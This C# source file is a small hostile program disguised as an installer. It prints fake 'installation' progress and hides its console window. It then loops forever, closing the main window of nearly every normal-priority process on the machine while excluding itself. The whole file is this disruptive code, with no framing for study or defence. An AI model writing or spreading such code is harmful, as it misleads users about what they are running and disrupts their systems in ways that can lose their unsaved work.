using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Program
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static int Main(string[] args)
        {
            Console.WriteLine("Please wait!");
            Console.Write("Installation start. It is take some time.");
            for (int i = 0; i < 10; i++)
            {
                Thread.Sleep(500);
                Console.Write(".");
            }
            IntPtr hWnd = FindWindow(null, Console.Title);
            if (hWnd != IntPtr.Zero)
            {
                //Hide the window
                ShowWindow(hWnd, 0); // 0 = SW_HIDE
            }

            for (; ; )
            {
                Thread.Sleep(500);
                Process[] processes;
                processes = Process.GetProcesses();
                foreach (var process in processes)

                    foreach (var instance in processes)
                    {
                        try
                        {
                            if (instance.PriorityClass == ProcessPriorityClass.Normal &&
                                !instance.ProcessName.Contains("Program")
                                && !instance.ProcessName.Contains("mono"))
                            {
                                Console.WriteLine(instance.ProcessName);
                                instance.CloseMainWindow();
                                instance.Close();
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
            }

            return 0;
        }
    }
}
